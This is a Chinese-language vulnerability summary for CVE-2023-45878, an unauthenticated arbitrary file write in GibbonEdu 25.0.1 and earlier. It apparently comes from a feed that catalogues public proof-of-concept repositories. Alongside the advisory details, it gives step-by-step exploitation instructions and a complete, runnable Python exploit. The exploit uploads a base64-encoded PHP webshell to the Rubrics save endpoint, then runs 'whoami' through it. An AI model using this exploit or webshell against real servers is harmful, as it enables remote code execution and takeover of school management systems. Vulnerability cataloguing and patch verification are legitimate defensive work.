## CVE-2023-45878-GibbonEdu-Arbitrary File Write

**漏洞编号:** CVE-2023-45878

**漏洞类型:** 任意文件写入

**影响应用:** GibbonEdu

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 25.0.1

**利用条件:** 需要网络访问，目标系统开启了GibbonEdu服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-45878是GibbonEdu 25.0.1及之前版本中存在的任意文件写入漏洞。攻击者无需身份验证即可利用该漏洞，通过向`modules/Rubrics/rubrics_visualise_saveAjax.php`发送特制的POST请求，其中`img`参数包含base64编码的恶意PHP代码，`path`参数指定写入的文件名。由于程序没有进行严格的验证，攻击者可以将恶意PHP代码写入Web目录，从而实现远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞的POC代码是有效的。POC代码模拟了攻击过程，通过POST请求向目标URL的`modules/Rubrics/rubrics_visualise_saveAjax.php`发送恶意数据，成功写入PHP文件。

**投毒风险：**
经过对POC代码的分析，未发现明显的投毒代码。该脚本的主要功能是利用漏洞在目标系统上写入一个包含命令执行功能的PHP文件，然后通过GET请求执行命令。没有发现任何作者隐藏的恶意行为，例如反向shell、数据窃取或其他未经授权的操作，因此投毒风险评估为0%。

**利用方式：**
1.  构造包含恶意PHP代码的base64编码字符串，例如用于执行系统命令的代码。
2.  构造POST请求，设置`img`参数为base64编码的恶意PHP代码，`path`参数为期望写入的文件名（通常是PHP后缀）。
3.  发送POST请求到`modules/Rubrics/rubrics_visualise_saveAjax.php`。
4.  如果写入成功，通过GET请求访问写入的PHP文件，并传递`cmd`参数来执行系统命令。

利用示例（基于提供的POC代码）：

```python
import requests
import sys
import random
import argparse
import string


def main():

    payload_file = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    endpoint = "modules/Rubrics/rubrics_visualise_saveAjax.php"
    payload = {
        "img":f"image/png;{payload_file},PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4=",
        "path":f"{payload_file}.php",
        "gibbonPersonID":"0000000001"

    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"

    }
    parser = argparse.ArgumentParser(description="GibbonEdu Gibbon version 25.0.1 Arbitrary File Write")
    parser.add_argument("url", type=str, help="Gibbon URL")
    args = parser.parse_args()

  
  
    print("Exploiting ...")
    print(f"{args.url}/{endpoint}")
    p_resp = requests.post(f"{args.url}/{endpoint}", headers=headers, data=payload)
    if p_resp.status_code!=200:
        print("[Err] Exploit failed!")
        sys.exit(-1)
    g_resp = requests.get(f"{args.url}/{payload_file}.php", params={"cmd":"whoami"})
    print(f"Got Webshell {args.url}/{payload_file}.php?cmd=whoami")
    print(g_resp.text)

if __name__ == '__main__':
    main()
```

该POC脚本首先生成一个随机的文件名，然后构造包含恶意PHP代码的payload，将payload发送到目标端点，如果写入成功，则通过GET请求访问写入的PHP文件并执行`whoami`命令，最后输出命令执行的结果。

**项目地址:** [killercd/CVE-2023-45878](https://github.com/killercd/CVE-2023-45878)

**漏洞详情:** [CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)